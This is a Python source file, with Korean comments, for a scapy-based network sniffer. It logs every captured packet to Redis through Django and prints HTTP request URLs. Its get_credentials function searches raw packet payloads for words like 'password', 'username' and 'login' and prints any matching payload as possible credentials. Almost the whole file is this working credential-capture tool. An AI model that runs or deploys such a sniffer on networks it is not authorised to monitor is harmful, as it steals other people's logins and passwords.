import hexdump
import scapy.all as scapy
from scapy_http import http

from datetime import datetime
import json
from collections import OrderedDict

from django_redis import get_redis_connection
from django.core.cache import cache

import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface name")
    options = parser.parse_args()
    return options


# scapy_http 패키지의 http.HTTPRequest 메소드를 사용하여 HTTP 레이어의 패키지 만 필터링.
# http://Host/ ... Path
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["login", "password", "username", "user", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_packets(packet):
    date=datetime.today().strftime("%Y/%m/%d-%H:%M:%S")
    hex_packet = hexdump.hexdump(bytes(packet),'return')

    group_data = OrderedDict()
    group_data["date"] = date
    group_data["packet"] = str(packet)

    json_data=json.dumps(group_data, ensure_ascii=False, indent="\t")

    # redis, connection pool, redis save
    con = get_redis_connection("default")
    con.expire(date,60*10)
    con.lpush(date,json_data)

    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] Http Request >> " + url)
        credentials = get_credentials(packet)
        if credentials:
            print("[+] Possible username/passowrd" + credentials + "\n\n")


# iface : network interface.
#  store : store result in memory.
# prn   : function name.
def sniff_packet(interface):
        scapy.sniff(iface=interface, store=False, prn=process_packets)


# options = get_arguments()
# sniff_packet(options.interface)
